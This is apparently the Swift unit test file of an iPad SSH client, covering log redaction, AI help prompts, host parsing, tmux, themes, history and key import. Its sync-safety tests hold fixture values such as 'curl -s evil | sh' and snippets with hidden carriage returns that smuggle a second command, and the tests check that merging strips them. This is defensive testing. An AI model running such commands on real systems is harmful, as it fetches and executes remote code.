import XCTest
import CryptoKit
@testable import VShellCore

final class SupportTests: XCTestCase {
    func testRedactMasksIPsAndPasswords() {
        let r = SupportLog.redact("connect 100.100.1.2:22 then 192.168.1.5 and 8.8.8.8 password=hunter2")
        XCTAssertFalse(r.contains("100.100.1.2")); XCTAssertFalse(r.contains("192.168.1.5")); XCTAssertFalse(r.contains("8.8.8.8"))
        XCTAssertTrue(r.contains("100.x.x.x(tailscale)")); XCTAssertTrue(r.contains("192.x.x.x(lan)")); XCTAssertTrue(r.contains("8.x.x.x(public)"))
        XCTAssertFalse(r.contains("hunter2"))
    }

    func testLogIsBoundedAndPersisted() {
        let d = UserDefaults(suiteName: "support-test-\(UUID())")!
        let log = SupportLog(defaults: d)
        for i in 0..<(SupportLog.maxLines + 10) { log.add("e\(i)") }
        XCTAssertEqual(log.recent.count, SupportLog.maxLines)
        XCTAssertTrue(log.recent.last!.hasSuffix("e\(SupportLog.maxLines + 9)"))
        XCTAssertEqual(SupportLog(defaults: d).recent.count, SupportLog.maxLines)
        log.clear(); XCTAssertTrue(SupportLog(defaults: d).recent.isEmpty)
    }

    func testPromptCarriesContextButNoSecrets() {
        let c = HelpContext(serverKind: "Mac", address: "mini.tail1234.ts.net", user: "ann", port: 2222,
                            lastError: "Password rejected", devicePublicKey: "ssh-ed25519 AAAAC3 v-shell@ipad", appVersion: "1.0", deviceOS: "iPadOS 26")
        for t in HelpTopic.allCases where t != .tailscale {   // Tailscale walkthrough is generic by design
            let p = AIHelpPrompt.make(t, c)
            XCTAssertTrue(p.contains("never ask me to paste a password"))
            XCTAssertTrue(p.contains("mini.tail1234.ts.net, port 2222"))
            XCTAssertTrue(p.contains("Password rejected"))
        }
        XCTAssertTrue(AIHelpPrompt.make(.addKey, c).contains("ssh-ed25519 AAAAC3"))
        XCTAssertFalse(AIHelpPrompt.make(.tmux, c).contains("ssh-ed25519"))
        XCTAssertTrue(AIHelpPrompt.make(.tailscale, c).contains("Never ask me for passwords"))
    }

    func testReportHasNoAddresses() {
        let r = SupportReport(appVersion: "1.0", build: "7", deviceModel: "iPad", deviceOS: "iPadOS 26", plan: "trial",
                              hosts: [.init(label: SupportReport.label(forAddress: "100.100.1.2"), port: 22, useTmux: true, metrics: 2),
                                      .init(label: SupportReport.label(forAddress: "myserver.com"), port: 2200, useTmux: false, metrics: 0)],
                              keyFingerprint: "SHA256:abc", lastError: "Can't reach 100.100.1.2", log: ["x connect tailscale:22"])
        let t = r.text
        XCTAssertFalse(t.contains("100.100.1.2")); XCTAssertFalse(t.contains("myserver.com"))
        XCTAssertTrue(t.contains("1. tailscale port 22 tmux on metrics 2"))
        XCTAssertTrue(t.contains("2. hostname port 2200"))
        XCTAssertEqual(SupportReport.label(forAddress: "192.168.1.9"), "lan")
        XCTAssertEqual(SupportReport.label(forAddress: "pi.local"), "lan")
        XCTAssertEqual(SupportReport.label(forAddress: "8.8.4.4"), "public-ip")
    }
}

final class PasteParserTests: XCTestCase {
    func testMacRemoteLoginSentence() {
        let inputs = [
            "To log in to this computer remotely, type \"ssh ann@192.168.1.20\".",
            "To log in to this computer remotely, type \u{201C}ssh ann@192.168.1.20\u{201D}.",
            "ssh ann@192.168.1.20.",
            "  ssh ann@192.168.1.20  \n",
            "\"ssh ann@192.168.1.20\"",
        ]
        for i in inputs {
            let h = SSHLinkParser.parse(i)
            XCTAssertEqual(h?.user, "ann", i); XCTAssertEqual(h?.hostname, "192.168.1.20", i); XCTAssertEqual(h?.port, 22, i)
        }
        XCTAssertEqual(SSHLinkParser.parse("type ssh -p 2222 ann@pi.local, then")?.port, 2222)
        XCTAssertEqual(SSHLinkParser.parse("type ssh -p 2222 ann@pi.local, then")?.hostname, "pi.local")
        XCTAssertNil(SSHLinkParser.parse("ssh is cool"))
        XCTAssertNil(SSHLinkParser.parse("hello world"))
    }
}

final class ComputerHintTests: XCTestCase {
    func testUserSuggestion() {
        XCTAssertEqual(ComputerHint.userSuggestion(fromComputerName: "Ann\u{2019}s Mac mini"), "ann")
        XCTAssertEqual(ComputerHint.userSuggestion(fromComputerName: "Anne's MacBook Air"), "anne")
        XCTAssertEqual(ComputerHint.userSuggestion(fromComputerName: "Mary Jo's iMac"), "mary")
        XCTAssertNil(ComputerHint.userSuggestion(fromComputerName: "VB"))
        XCTAssertNil(ComputerHint.userSuggestion(fromComputerName: "raspberrypi"))
        XCTAssertEqual(ComputerHint.symbol(forComputerName: "Ann's Mac mini"), "macmini")
        XCTAssertEqual(ComputerHint.symbol(forComputerName: "Anne's MacBook Air"), "laptopcomputer")
    }
}

final class TmuxOptionTests: XCTestCase {
    func testOldHostJSONDecodes() throws {
        let json = #"{"id":"6F9619FF-8B86-D011-B42D-00C04FC964FF","name":"mini","hostname":"annes-mac.local","port":22,"user":"ann","keyID":"default","useTmux":true,"tmuxSession":"vshell","startupCommand":"","createdAt":0}"#
        let h = try JSONDecoder().decode(Host.self, from: Data(json.utf8))
        XCTAssertFalse(h.showTmuxStatus); XCTAssertEqual(h.name, "mini")
        let back = try JSONDecoder().decode(Host.self, from: JSONEncoder().encode(h))
        XCTAssertEqual(back, h)
    }
    func testSessionNamesPerTab() {
        let h = Host(hostname: "x", user: "u")
        XCTAssertEqual(h.tmuxSessionName(tab: 0), "vshell")
        XCTAssertEqual(h.tmuxSessionName(tab: 1), "vshell-2")
    }
    func testAttachCommand() {
        let plain = RemoteCommands.tmuxAttach(session: "vshell-2")
        XCTAssertTrue(plain.contains("new-session -A -s vshell-2 \\; set-option status off \\; set-option mouse on"))
        XCTAssertTrue(plain.contains("~/.tmux.conf"))
        XCTAssertFalse(RemoteCommands.tmuxAttach(session: "vshell", plain: false).contains("status off"))
        let withStart = RemoteCommands.tmuxAttach(session: "vshell", startup: "cd ~/my app && claude")
        XCTAssertTrue(withStart.contains("new-session -A -s vshell 'cd ~/my app && claude; exec \"${SHELL:-/bin/sh}\" -l'"), withStart)
    }
}

final class ThemeCatalogTests: XCTestCase {
    private func lum(_ hex: String) -> Double {
        let (r, g, b) = Theme.rgb(hex)
        func c(_ v: UInt8) -> Double { let x = Double(v) / 255; return x <= 0.03928 ? x / 12.92 : pow((x + 0.055) / 1.055, 2.4) }
        return 0.2126 * c(r) + 0.7152 * c(g) + 0.0722 * c(b)
    }
    func testCatalog() {
        XCTAssertEqual(Theme.all.count, 13)
        XCTAssertEqual(Set(Theme.all.map(\.id)).count, 13)
        for t in Theme.all {
            XCTAssertEqual(t.ansi.count, 16, t.id)
            let (a, b) = (lum(t.foreground), lum(t.background))
            let ratio = (max(a, b) + 0.05) / (min(a, b) + 0.05)
            XCTAssertGreaterThanOrEqual(ratio, 4.5, "\(t.name) text contrast \(ratio)")
        }
        XCTAssertEqual(Theme.named("paper").id, "classic-light")
        XCTAssertEqual(Theme.named("vampire").id, "dracula")
        XCTAssertEqual(Theme.named("nope").id, Theme.default.id)
        XCTAssertTrue(Theme.named("classic-light").isLight)
        XCTAssertFalse(Theme.named("dracula").isLight)
    }
}

final class CommandHistoryTests: XCTestCase {
    func testRecordsSentCommandsNotSecrets() {
        let d = UserDefaults(suiteName: "hist-\(UUID())")!
        let h = CommandHistory(defaults: d); let id = UUID()
        h.record("ls", host: id); h.record("claude", host: id); h.record("ls", host: id)
        XCTAssertEqual(h.recent(for: id), ["ls", "claude"])
        h.record("hunter2", host: id, cursorLine: "Password: ")
        h.record("hunter2", host: id, cursorLine: "[sudo] password for ann: ")
        h.record("abc", host: id, cursorLine: "Enter passphrase for key '/x': ")
        XCTAssertFalse(h.recent(for: id).contains("hunter2")); XCTAssertFalse(h.recent(for: id).contains("abc"))
        h.record("git status", host: id, cursorLine: "ann@mac ~ % ")
        XCTAssertEqual(h.recent(for: id).first, "git status")
        for i in 0..<250 { h.record("c\(i)", host: id) }
        XCTAssertEqual(h.recent(for: id).count, CommandHistory.limit)
        h.clear(host: id); XCTAssertTrue(h.recent(for: id).isEmpty)
        XCTAssertTrue(Entitlements.free.canSaveCommand(currentCount: 2)); XCTAssertFalse(Entitlements.free.canSaveCommand(currentCount: 3))
        XCTAssertTrue(Entitlements.pro.canSaveCommand(currentCount: 99))
    }
}

final class AwayAddressTests: XCTestCase {
    func testAddressOrderByNetwork() {
        var h = Host(name: "Mac mini", hostname: "mini.local", user: "ann")
        XCTAssertEqual(h.addresses(onCellular: true), ["mini.local"])
        XCTAssertFalse(h.worksAway)
        h.awayAddress = "100.101.2.3"
        XCTAssertEqual(h.addresses(onCellular: false), ["mini.local", "100.101.2.3"])
        XCTAssertEqual(h.addresses(onCellular: true), ["100.101.2.3", "mini.local"])
        XCTAssertTrue(h.worksAway)
    }

    func testOldSavedHostsDecodeWithoutAwayAddress() throws {
        let json = #"{"id":"6F9619FF-8B86-D011-B42D-00CF4FC964FF","hostname":"mini.local","user":"ann"}"#
        let h = try JSONDecoder().decode(Host.self, from: Data(json.utf8))
        XCTAssertNil(h.awayAddress)
        let round = try JSONDecoder().decode(Host.self, from: JSONEncoder().encode(Host(hostname: "a", user: "b", awayAddress: "x.ts.net")))
        XCTAssertEqual(round.awayAddress, "x.ts.net")
    }

    func testTailscaleLookupParse() {
        XCTAssertEqual(TailscaleLookup.parse("100.101.2.3\n"), "100.101.2.3")
        XCTAssertNil(TailscaleLookup.parse("192.168.1.4\n"))
        XCTAssertNil(TailscaleLookup.parse("zsh: command not found: tailscale"))
    }

    func testTailscalePromptsHaveNoSecretsAndUseAppLabels() {
        let a = AIHelpPrompt.make(.tailscale, HelpContext(serverKind: "Mac", devicePublicKey: "ssh-ed25519 AAAA"))
        XCTAssertTrue(a.contains("my Mac when I'm away"))
        XCTAssertTrue(a.contains("Add computer > Use Tailscale"))
        XCTAssertFalse(a.contains("ssh-ed25519"))
        XCTAssertTrue(AIHelpPrompt.tailscaleOnComputer.contains("ask before you install"))
        XCTAssertFalse(AIHelpPrompt.make(.setUpServer, HelpContext()).contains("Add server"))
    }
}

final class ServerAudienceTests: XCTestCase {
    func testAddressKind() {
        XCTAssertEqual(NetworkHint.kind(of: "203.0.113.5"), .publicAddress)
        XCTAssertEqual(NetworkHint.kind(of: "ec2-1-2-3-4.compute-1.amazonaws.com"), .publicAddress)
        XCTAssertEqual(NetworkHint.kind(of: "mini.local"), .home)
        XCTAssertEqual(NetworkHint.kind(of: "192.168.1.4"), .home)
        XCTAssertEqual(NetworkHint.kind(of: "100.101.2.3"), .tailscale)
        XCTAssertEqual(NetworkHint.kind(of: "mini"), .unknown)
        XCTAssertTrue(Host(hostname: "203.0.113.5", user: "root").isPublicAddress)
        XCTAssertEqual(Host(hostname: "203.0.113.5", user: "root").noun, "server")
        XCTAssertFalse(NetworkHint.unreachableAdvice(for: "203.0.113.5").contains("Wi-Fi"))
    }

    func testPasteFromProviderInstructions() {
        let h = SSHLinkParser.parse("ssh -i mykey.pem -p 2222 ubuntu@ec2-1-2-3-4.compute-1.amazonaws.com")
        XCTAssertEqual(h?.user, "ubuntu"); XCTAssertEqual(h?.port, 2222)
        XCTAssertTrue(SSHLinkParser.mentionsKeyFile("ssh -i mykey.pem ubuntu@host"))
        XCTAssertFalse(SSHLinkParser.mentionsKeyFile("ssh root@203.0.113.5"))
    }

    /// Makes a throwaway key with the system ssh-keygen (never stored in the repo).
    func keygen(_ type: String, bits: String? = nil, passphrase: String = "") throws -> (priv: String, pub: String) {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let f = dir.appendingPathComponent("k").path
        let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/ssh-keygen")
        p.arguments = ["-q", "-t", type] + (bits.map { ["-b", $0] } ?? []) + ["-N", passphrase, "-C", "test", "-f", f]
        try p.run(); p.waitUntilExit()
        let pub = try String(contentsOfFile: f + ".pub", encoding: .utf8).split(separator: " ").prefix(2).joined(separator: " ")
        return (try String(contentsOfFile: f, encoding: .utf8), pub)
    }

    func testKeyImportOpenSSHFiles() throws {
        let ed = try keygen("ed25519")
        XCTAssertTrue(try KeyImport.parse(ed.priv).publicKeyLine(comment: "test").hasPrefix(ed.pub))
        let ec = try keygen("ecdsa", bits: "384")
        XCTAssertTrue(try KeyImport.parse(ec.priv).publicKeyLine(comment: "test").hasPrefix(ec.pub))
        let enc = try keygen("ed25519", passphrase: "secret-pass")
        XCTAssertThrowsError(try KeyImport.parse(enc.priv)) { XCTAssertEqual($0 as? KeyImportError, .encrypted) }
        let rsa = try keygen("rsa", bits: "2048")
        XCTAssertThrowsError(try KeyImport.parse(rsa.priv)) { XCTAssertEqual($0 as? KeyImportError, .rsa) }
    }

    func testKeyImportECDSAAndRejections() throws {
        let k = P256.Signing.PrivateKey()
        let parsed = try KeyImport.parse(k.pemRepresentation)
        guard case .p256(let p) = parsed else { return XCTFail("expected p256") }
        XCTAssertEqual(p.rawRepresentation, k.rawRepresentation)
        XCTAssertTrue(parsed.publicKeyLine(comment: "x").hasPrefix("ecdsa-sha2-nistp256 "))
        XCTAssertThrowsError(try KeyImport.parse("-----BEGIN RSA " + "PRIVATE KEY-----\nMIIE\n-----END RSA " + "PRIVATE KEY-----")) {
            XCTAssertEqual($0 as? KeyImportError, .rsa)
        }
        XCTAssertThrowsError(try KeyImport.parse("ssh-ed25519 AAAA me")) { XCTAssertEqual($0 as? KeyImportError, .notAKey) }
    }

    func testImportedKeyRoundTripsThroughStore() throws {
        let km = KeyManager(store: MemorySecretStore())
        let id = try km.importKey(.p256(P256.Signing.PrivateKey()))
        XCTAssertNotNil(km.signingKey(id))
        XCTAssertNil(km.privateKey(id))                 // not an ed25519 device key
        try km.ensureKey()
        guard case .ed25519 = km.signingKey() else { return XCTFail("device key should load as ed25519") }
    }
}

final class SyncSafetyTests: XCTestCase {
    func testMergeStripsRunnableContent() {
        let store = HostStore(backing: MemoryBacking())
        var evil = Host(name: "Mac mini", hostname: "mini.local", user: "ann", startupCommand: "curl -s evil | sh")
        evil.keyID = "imported-x"
        store.merge(remoteHosts: [evil, Host(hostname: "bad host", user: "x")],
                    remoteSnippets: [Snippet(title: "ls", command: "curl x|sh", runImmediately: true)])
        XCTAssertEqual(store.hosts.count, 1)
        XCTAssertEqual(store.hosts.first?.startupCommand, "")
        XCTAssertEqual(store.hosts.first?.keyID, KeyManager.defaultKeyID)
        XCTAssertEqual(store.snippets.first?.runImmediately, false)
    }

    /// A synced snippet can't carry its own Return (or Ctrl/ESC keys) to run a second command.
    func testMergeStripsHiddenKeypresses() {
        let store = HostStore(backing: MemoryBacking())
        store.merge(remoteHosts: [], remoteSnippets: [
            Snippet(title: "git status\r", command: "git status\rcurl -s evil.sh/x|sh\r\n\u{03}\u{1B}[A\u{7F}\u{9B}", runImmediately: true)])
        XCTAssertEqual(store.snippets.first?.command, "git statuscurl -s evil.sh/x|sh[A")
        XCTAssertEqual(store.snippets.first?.title, "git status")
        XCTAssertEqual(ShellQuote.typeOnly("ls -la ~/code"), "ls -la ~/code")
    }

    func testMergeDuplicateIgnoresCase() {
        let store = HostStore(backing: MemoryBacking())
        store.merge(remoteHosts: [Host(name: "Mac", hostname: "mini.local", user: "ann")], remoteSnippets: [])
        store.merge(remoteHosts: [Host(name: "Mac mini", hostname: "MINI.local", user: "ann")], remoteSnippets: [])
        XCTAssertEqual(store.hosts.count, 1)
    }

    func testSetupLinkFingerprint() {
        let raw = "vshell://add?host=mini.local&user=ann&port=22&name=Mac&fp=SHA256%3Aab%2Bcd%2Fef"
        XCTAssertEqual(SSHLinkParser.fingerprint(in: raw), "SHA256:ab+cd/ef")
        XCTAssertEqual(SSHLinkParser.fingerprint(in: "vshell://add?host=a&user=b&fp=SHA256:ab+cd"), "SHA256:ab+cd")
        XCTAssertNil(SSHLinkParser.fingerprint(in: "ssh://ann@mini.local"))
    }
}
